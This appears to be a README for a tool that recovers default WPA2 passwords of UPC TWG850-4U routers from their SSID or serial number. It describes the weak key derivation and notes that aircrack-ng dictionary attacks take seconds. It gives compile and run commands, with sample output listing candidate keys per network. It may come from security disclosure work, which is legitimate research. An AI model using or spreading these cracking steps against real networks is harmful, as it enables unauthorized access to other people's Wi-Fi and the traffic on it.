# TWG850-4U UPC%06d WPA2 keys

Same as in the [Technicolor TC7200.U](https://haxx.in/upc-wifi/), the Wi-Fi SSID and
password are derived from the device's serial number.
However, for the TWG850-4U, there are around 8000-12000
possible WPA2 keys for each UPC%06d network, as opposed
to ~20 keys in the TC7200.U - still good enough for
a dictionary attack though: `aircrack-ng` takes less than 5 seconds.

The WiFi channel number is also derived from the serial
number, but in such a way that it's guaranteed to be either
channel 1 or 6 (or 11, but the algorithm used almost never
generates channel 11). The distribution is 1/3 channel 1,
and 2/3 channel 6. The channel number printed on the bottom
label is _not_ used!

`$ cc upc-twg850.c -o upc-twg850`

Print WPA2 key and SSID for serial number `00939-907201352`

```
$ ./upc-twg850 00939907201352
00939-907201352  6   UPC009038  AALOMMAA
```
Get serial numbers and WPA2 keys for SSID `UPC009065`

<pre>
$ ./upc-twg850 UPC009065
[...]
00939-907002034  1   UPC009065  IQVCGOKQ  
00939-907101693  6   UPC009065  IUQQQCBY  
<b>00939-907201352  6   UPC009065  AALOMMAA</b>
00939-907301011  1   UPC009065  QGGQKWBE  
00939-907400670  6   UPC009065  EIMDZWKS
[...]
</pre>

Same as above, but limit search to channel 6

<pre>
$ ./upc-twg850 UPC009065 6
[...]
00939-906500332  6   UPC009065  BDMWZWKE  
00939-907101693  6   UPC009065  IUQQQCBY  
<b>00939-907201352  6   UPC009065  AALOMMAA</b>
00939-907400670  6   UPC009065  EIMDZWKS  
00939-907500329  6   UPC009065  CSAAAAYZ
[...]
</pre>


